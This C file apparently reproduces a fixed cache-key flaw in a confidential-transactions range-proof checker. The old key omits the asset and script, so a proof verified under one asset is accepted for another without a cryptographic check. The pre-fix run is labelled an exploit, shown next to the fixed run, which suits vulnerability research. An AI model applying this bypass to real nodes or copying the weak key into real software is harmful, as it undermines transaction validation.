/* Faithful reproduction of Elements CachingRangeProofChecker behavior
 * (pre-fix and post-fix key derivation), using real secp256k1_rangeproof_verify.
 * Cache is a simple set of 32-byte keys (salt omitted identically for both modes;
 * relative equality of keys across contexts is what matters).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <secp256k1.h>
#include <secp256k1_generator.h>
#include <secp256k1_rangeproof.h>

/* SHA256 */
typedef struct { uint32_t s[8]; uint64_t bits; unsigned char buf[64]; int n; } SHA256_CTX;
static uint32_t rotr(uint32_t x,int n){return (x>>n)|(x<<(32-n));}
static void sha256_transform(SHA256_CTX *c, const unsigned char *d){
  static const uint32_t K[64]={0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2};
  uint32_t w[64],a,b,c2,d2,e,f,g,h,t1,t2; int i;
  for(i=0;i<16;i++) w[i]=(d[4*i]<<24)|(d[4*i+1]<<16)|(d[4*i+2]<<8)|d[4*i+3];
  for(;i<64;i++){ uint32_t s0=rotr(w[i-15],7)^rotr(w[i-15],18)^(w[i-15]>>3); uint32_t s1=rotr(w[i-2],17)^rotr(w[i-2],19)^(w[i-2]>>10); w[i]=w[i-16]+s0+w[i-7]+s1; }
  a=c->s[0];b=c->s[1];c2=c->s[2];d2=c->s[3];e=c->s[4];f=c->s[5];g=c->s[6];h=c->s[7];
  for(i=0;i<64;i++){ uint32_t S1=rotr(e,6)^rotr(e,11)^rotr(e,25); uint32_t ch=(e&f)^((~e)&g); t1=h+S1+ch+K[i]+w[i]; uint32_t S0=rotr(a,2)^rotr(a,13)^rotr(a,22); uint32_t maj=(a&b)^(a&c2)^(b&c2); t2=S0+maj; h=g;g=f;f=e;e=d2+t1;d2=c2;c2=b;b=a;a=t1+t2; }
  for(i=0;i<8;i++) c->s[i]+= (i==0?a:i==1?b:i==2?c2:i==3?d2:i==4?e:i==5?f:i==6?g:h);
}
static void sha256_init(SHA256_CTX *c){ c->s[0]=0x6a09e667;c->s[1]=0xbb67ae85;c->s[2]=0x3c6ef372;c->s[3]=0xa54ff53a;c->s[4]=0x510e527f;c->s[5]=0x9b05688c;c->s[6]=0x1f83d9ab;c->s[7]=0x5be0cd19; c->bits=0;c->n=0; }
static void sha256_update(SHA256_CTX *c,const unsigned char *d,size_t len){ c->bits+=(uint64_t)len*8; while(len--){ c->buf[c->n++]=*d++; if(c->n==64){sha256_transform(c,c->buf);c->n=0;} } }
static void sha256_final(SHA256_CTX *c,unsigned char out[32]){ int i; uint64_t bits=c->bits; c->buf[c->n++]=0x80; if(c->n>56){while(c->n<64)c->buf[c->n++]=0;sha256_transform(c,c->buf);c->n=0;} while(c->n<56)c->buf[c->n++]=0; for(i=7;i>=0;i--)c->buf[c->n++]=(unsigned char)(bits>>(8*i)); sha256_transform(c,c->buf); for(i=0;i<8;i++){out[4*i]=c->s[i]>>24;out[4*i+1]=c->s[i]>>16;out[4*i+2]=c->s[i]>>8;out[4*i+3]=c->s[i];} }

enum mode { OLD=0, NEW=1 };
typedef struct { unsigned char keys[64][32]; int n; } cache_t;

static void key_old(unsigned char out[32], const unsigned char *proof,size_t plen,const unsigned char *commit){
  SHA256_CTX c; sha256_init(&c); sha256_update(&c,proof,plen); sha256_update(&c,commit,33); sha256_final(&c,out);
}
static void key_new(unsigned char out[32], const unsigned char *proof,size_t plen,const unsigned char *commit,const unsigned char *asset,const unsigned char *script,size_t slen){
  SHA256_CTX c; sha256_init(&c); sha256_update(&c,proof,plen); sha256_update(&c,commit,33); sha256_update(&c,asset,33); if(slen) sha256_update(&c,script,slen); sha256_final(&c,out);
}
static int cache_has(cache_t *c, const unsigned char k[32]){ for(int i=0;i<c->n;i++) if(!memcmp(c->keys[i],k,32)) return 1; return 0; }
static void cache_add(cache_t *c, const unsigned char k[32]){ if(c->n<64 && !cache_has(c,k)){ memcpy(c->keys[c->n++],k,32);} }

/* Mirrors Elements CachingRangeProofChecker::VerifyRangeProof control flow */
static int VerifyRangeProof_Elements(secp256k1_context *ctx, cache_t *cache, enum mode m, int store,
  const unsigned char *proof, size_t plen,
  const unsigned char *commit33,
  const unsigned char *asset33, /* serialized generator as Elements passes after explicit->generator conversion */
  const unsigned char *script, size_t slen,
  int *hit_out, int *crypto_out)
{
  unsigned char entry[32];
  if(m==OLD) key_old(entry, proof, plen, commit33);
  else key_new(entry, proof, plen, commit33, asset33, script, slen);

  if(cache_has(cache, entry)){
    if(hit_out)*hit_out=1; if(crypto_out)*crypto_out=-1;
    return 1; /* Elements returns true on hit WITHOUT re-checking crypto */
  }
  if(hit_out)*hit_out=0;
  if(plen==0){ if(crypto_out)*crypto_out=0; return 0; }

  secp256k1_pedersen_commitment commit;
  if(!secp256k1_pedersen_commitment_parse(ctx,&commit,commit33)){ if(crypto_out)*crypto_out=0; return 0; }
  secp256k1_generator tag;
  if(!secp256k1_generator_parse(ctx,&tag,asset33)){ if(crypto_out)*crypto_out=0; return 0; }

  uint64_t min_value=0, max_value=0;
  int ok = secp256k1_rangeproof_verify(ctx,&min_value,&max_value,&commit,proof,plen, slen?script:NULL, slen, &tag);
  if(crypto_out)*crypto_out=ok;
  if(!ok) return 0;

  /* Elements policy: min_value==0 && !IsUnspendable => false.
     OP_RETURN (0x6a) and OP_TRUE etc.: treat 0x6a as unspendable; 0x51 spendable for our tests. */
  int unspendable = (slen==1 && script[0]==0x6a) || (slen==0);
  if(min_value==0 && !unspendable) return 0;

  if(store) cache_add(cache, entry);
  return 1;
}

static int hx(const char *hex, unsigned char *out, size_t expect){
  size_t L=strlen(hex); if(L!=expect*2) return 0;
  for(size_t i=0;i<expect;i++){ unsigned a=0,b=0; sscanf(hex+2*i,"%2x",&a); out[i]=a; (void)b; }
  /* proper */
  for(size_t i=0;i<expect;i++){
    int v=0; char t[3]={hex[2*i],hex[2*i+1],0}; if(sscanf(t,"%x",&v)!=1) return 0; out[i]=(unsigned char)v;
  }
  return 1;
}

static int make_pair(secp256k1_context *ctx,
  unsigned char proof[5200], size_t *plen,
  unsigned char commit[33], unsigned char assetA[33], unsigned char assetB[33],
  unsigned char scriptA[1], unsigned char scriptB[1])
{
  unsigned char seedA[32], seedB[32], blind[32], nonce[32];
  memset(seedA,0xA1,32); memset(seedB,0xB2,32); memset(blind,0xC3,32); memset(nonce,0xD4,32);
  uint64_t value=42;
  secp256k1_generator gA,gB; secp256k1_pedersen_commitment ped;
  if(!secp256k1_generator_generate(ctx,&gA,seedA)) return 0;
  if(!secp256k1_generator_generate(ctx,&gB,seedB)) return 0;
  secp256k1_generator_serialize(ctx,assetA,&gA);
  secp256k1_generator_serialize(ctx,assetB,&gB);
  if(!secp256k1_pedersen_commit(ctx,&ped,blind,value,&gA)) return 0;
  secp256k1_pedersen_commitment_serialize(ctx,commit,&ped);
  scriptA[0]=0x51; scriptB[0]=0x6a;
  *plen=5200;
  if(!secp256k1_rangeproof_sign(ctx,proof,plen,1,&ped,blind,nonce,0,32,value,NULL,0,scriptA,1,&gA)) return 0;
  return 1;
}

static void run(const char *title, enum mode m, int order_BA){
  printf("\n== %s ==\n", title);
  secp256k1_context *ctx=secp256k1_context_create(SECP256K1_CONTEXT_VERIFY|SECP256K1_CONTEXT_SIGN);
  unsigned char proof[5200], commit[33], aA[33], aB[33], sA[1], sB[1]; size_t plen=0;
  if(!make_pair(ctx,proof,&plen,commit,aA,aB,sA,sB)){ printf("make_pair fail\n"); return; }
  cache_t cache; memset(&cache,0,sizeof cache);
  int hit=0,crypto=0,r1,r2;
  if(!order_BA){
    r1=VerifyRangeProof_Elements(ctx,&cache,m,1,proof,plen,commit,aA,sA,1,&hit,&crypto);
    printf("A: ret=%d hit=%d crypto=%d\n", r1,hit,crypto);
    r2=VerifyRangeProof_Elements(ctx,&cache,m,1,proof,plen,commit,aB,sB,1,&hit,&crypto);
    printf("B: ret=%d hit=%d crypto=%d\n", r2,hit,crypto);
  } else {
    r1=VerifyRangeProof_Elements(ctx,&cache,m,1,proof,plen,commit,aB,sB,1,&hit,&crypto);
    printf("B: ret=%d hit=%d crypto=%d\n", r1,hit,crypto);
    r2=VerifyRangeProof_Elements(ctx,&cache,m,1,proof,plen,commit,aA,sA,1,&hit,&crypto);
    printf("A: ret=%d hit=%d crypto=%d\n", r2,hit,crypto);
  }
  secp256k1_context_destroy(ctx);
}

/* Also: try historical P1/C1 under Elements flow (will fail crypto; no priming available) */
static void try_f24a(enum mode m){
  printf("\n== f24a P1/C1 Elements-flow mode=%s ==\n", m==OLD?"OLD":"NEW");
  FILE *f; char *ph=NULL,*ch=NULL,*ah=NULL,*sh=NULL; size_t n;
  f=fopen("data/out1_rangeproof.hex","r"); if(!f)return; fseek(f,0,SEEK_END); n=ftell(f); fseek(f,0,SEEK_SET); ph=malloc(n+1); fread(ph,1,n,f); ph[n]=0; fclose(f);
  while(n&&(ph[n-1]=='\n'||ph[n-1]=='\r')) ph[--n]=0;
  f=fopen("data/out1_commitment.hex","r"); fseek(f,0,SEEK_END); n=ftell(f); fseek(f,0,SEEK_SET); ch=malloc(n+1); fread(ch,1,n,f); ch[n]=0; fclose(f);
  while(n&&(ch[n-1]=='\n'||ch[n-1]=='\r')) ch[--n]=0;
  f=fopen("data/out1_asset.hex","r"); fseek(f,0,SEEK_END); n=ftell(f); fseek(f,0,SEEK_SET); ah=malloc(n+1); fread(ah,1,n,f); ah[n]=0; fclose(f);
  while(n&&(ah[n-1]=='\n'||ah[n-1]=='\r')) ah[--n]=0;
  f=fopen("data/out1_script.hex","r"); fseek(f,0,SEEK_END); n=ftell(f); fseek(f,0,SEEK_SET); sh=malloc(n+1); fread(sh,1,n,f); sh[n]=0; fclose(f);
  while(n&&(sh[n-1]=='\n'||sh[n-1]=='\r')) sh[--n]=0;

  size_t plen=strlen(ph)/2, al=strlen(ah)/2, sl=strlen(sh)/2;
  unsigned char *proof=malloc(plen), commit[33], asset_raw[33], script[64], asset_ser[33];
  for(size_t i=0;i<plen;i++){ unsigned v; sscanf(ph+2*i,"%2x",&v); proof[i]=v; }
  for(size_t i=0;i<33;i++){ unsigned v; sscanf(ch+2*i,"%2x",&v); commit[i]=v; }
  for(size_t i=0;i<al;i++){ unsigned v; sscanf(ah+2*i,"%2x",&v); asset_raw[i]=v; }
  for(size_t i=0;i<sl;i++){ unsigned v; sscanf(sh+2*i,"%2x",&v); script[i]=v; }

  secp256k1_context *ctx=secp256k1_context_create(SECP256K1_CONTEXT_VERIFY|SECP256K1_CONTEXT_SIGN);
  /* Elements converts explicit asset to generator serialization before cache/verify */
  secp256k1_generator gen;
  if(asset_raw[0]==0x01){ secp256k1_generator_generate(ctx,&gen,asset_raw+1); secp256k1_generator_serialize(ctx,asset_ser,&gen); }
  else { memcpy(asset_ser,asset_raw,33); }

  cache_t cache; memset(&cache,0,sizeof cache);
  int hit=0,crypto=0;
  int r=VerifyRangeProof_Elements(ctx,&cache,m,1,proof,plen,commit,asset_ser,script,sl,&hit,&crypto);
  printf("clean cache verify f24a out1: ret=%d hit=%d crypto=%d\n", r,hit,crypto);
  free(proof); free(ph); free(ch); free(ah); free(sh);
  secp256k1_context_destroy(ctx);
}

int main(void){
  run("OLD A->B (exploit)", OLD, 0);
  run("NEW A->B (fixed)", NEW, 0);
  run("OLD B->A", OLD, 1);
  run("NEW B->A", NEW, 1);
  try_f24a(OLD);
  try_f24a(NEW);
  return 0;
}
